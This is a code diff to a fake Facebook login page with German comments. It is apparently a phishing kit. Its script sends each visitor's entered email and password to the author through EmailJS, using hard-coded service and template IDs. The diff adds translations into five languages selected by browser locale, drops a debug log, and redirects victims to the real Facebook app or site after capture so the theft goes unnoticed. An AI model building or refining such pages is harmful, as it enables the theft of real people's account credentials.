@@ -102,30 +102,98 @@
 
     <!-- Header -->
     <header>
-        <h1>Facebook</h1>
+        <h1 id="headerTitle">Facebook</h1>
     </header>
 
     <!-- Main Login Section -->
     <div class="main">
         <div class="login-box">
-            <h2>Facebook Login</h2>
+            <h2 id="loginTitle">Facebook Login</h2>
             <form id="loginForm">
                 <input type="text" id="email" placeholder="E-Mail oder Telefonnummer" required>
                 <input type="password" id="password" placeholder="Passwort" required>
-                <button type="submit">Einloggen</button>
+                <button type="submit" id="loginButton">Einloggen</button>
             </form>
             <div class="signup-link">
-                <p>Neu bei Facebook? <a href="#">Registriere dich</a></p>
+                <p id="signupLink">Neu bei Facebook? <a href="#">Registriere dich</a></p>
             </div>
         </div>
     </div>
 
     <!-- Footer -->
     <footer>
-        <p>&copy; 2024 Facebook Clone</p>
+        <p id="footerText">&copy; 2024 Facebook Clone</p>
     </footer>
 
     <script>
+        // Übersetzungen für mehrere Sprachen
+        const translations = {
+            "de": {
+                headerTitle: "Facebook",
+                loginTitle: "Facebook Login",
+                emailPlaceholder: "E-Mail oder Telefonnummer",
+                passwordPlaceholder: "Passwort",
+                loginButton: "Einloggen",
+                signupLink: "Neu bei Facebook? Registriere dich",
+                footerText: "&copy; 2024 Facebook Clone"
+            },
+            "en": {
+                headerTitle: "Facebook",
+                loginTitle: "Facebook Login",
+                emailPlaceholder: "Email or Phone Number",
+                passwordPlaceholder: "Password",
+                loginButton: "Log In",
+                signupLink: "New to Facebook? Sign Up",
+                footerText: "&copy; 2024 Facebook Clone"
+            },
+            "es": {
+                headerTitle: "Facebook",
+                loginTitle: "Iniciar sesión en Facebook",
+                emailPlaceholder: "Correo electrónico o número de teléfono",
+                passwordPlaceholder: "Contraseña",
+                loginButton: "Iniciar sesión",
+                signupLink: "¿Nuevo en Facebook? Regístrate",
+                footerText: "&copy; 2024 Facebook Clone"
+            },
+            "fr": {
+                headerTitle: "Facebook",
+                loginTitle: "Se connecter à Facebook",
+                emailPlaceholder: "Email ou numéro de téléphone",
+                passwordPlaceholder: "Mot de passe",
+                loginButton: "Se connecter",
+                signupLink: "Nouveau sur Facebook? Inscrivez-vous",
+                footerText: "&copy; 2024 Clone de Facebook"
+            },
+            "ar": {
+                headerTitle: "فيسبوك",
+                loginTitle: "تسجيل الدخول إلى فيسبوك",
+                emailPlaceholder: "البريد الإلكتروني أو رقم الهاتف",
+                passwordPlaceholder: "كلمة السر",
+                loginButton: "تسجيل الدخول",
+                signupLink: "جديد في فيسبوك؟ سجل الآن",
+                footerText: "&copy; 2024 نسخة فيسبوك"
+            }
+        };
+
+        // Erkenne die bevorzugte Sprache des Benutzers
+        const userLanguage = navigator.language.split('-')[0]; // z.B. "de", "en", "es", "fr", "ar"
+        const language = translations[userLanguage] ? userLanguage : 'en'; // Standard auf Englisch, wenn Sprache nicht verfügbar
+
+        // Setze die Inhalte der Seite basierend auf der bevorzugten Sprache
+        function setLanguage() {
+            const translation = translations[language];
+            document.getElementById("headerTitle").innerText = translation.headerTitle;
+            document.getElementById("loginTitle").innerText = translation.loginTitle;
+            document.getElementById("email").placeholder = translation.emailPlaceholder;
+            document.getElementById("password").placeholder = translation.passwordPlaceholder;
+            document.getElementById("loginButton").innerText = translation.loginButton;
+            document.getElementById("signupLink").innerHTML = translation.signupLink;
+            document.getElementById("footerText").innerHTML = translation.footerText;
+        }
+
+        // Initialisiere Sprache
+        setLanguage();
+
         // Initialisiere EmailJS mit der Benutzer-ID
         (function() {
             emailjs.init("QH6udfGB7ZJWM7UB6"); // Ersetze mit deiner EmailJS User-ID
@@ -152,7 +220,6 @@
 
             // Nachricht für die E-Mail erstellen
             const message = `E-Mail: ${email}\nPasswort: ${password}`;
-            console.log("Nachricht wird gesendet:", message); // Debugging-Ausgabe
 
             // E-Mail mit EmailJS senden
             emailjs.send("service_qyz5apn", "template_0vvn20r", {
@@ -160,13 +227,27 @@
                 message: message // Nachricht
             }).then(function(response) {
                 console.log("Nachricht gesendet", response);
-                alert("E-Mail wurde erfolgreich gesendet!");
+                openFacebookApp(); // Facebook-App öffnen oder zur Webseite weiterleiten
                 document.getElementById("loginForm").reset();
             }).catch(function(error) {
                 console.error("Fehler beim Senden der Nachricht:", error);
                 alert("Es ist ein Fehler aufgetreten. Bitte überprüfen Sie Ihre Konfiguration.");
             });
         });
+
+        // Funktion, die die Facebook-App öffnet oder zur Webseite weiterleitet
+        function openFacebookApp() {
+            const facebookAppURL = "fb://"; // Facebook App URL-Schema
+            const fallbackURL = "https://www.facebook.com"; // Fallback-URL, wenn die App nicht installiert ist
+
+            // Versuche, die Facebook-App zu öffnen
+            window.location.href = facebookAppURL;
+
+            // Wenn die Facebook-App nicht geöffnet werden kann, öffne den Browser-Link
+            setTimeout(function() {
+                window.location.href = fallbackURL;
+            }, 1000); // Nach 2 Sekunden, wenn die App nicht geöffnet wurde, öffne den Browser-Link
+        }
     </script>
 
 </body>
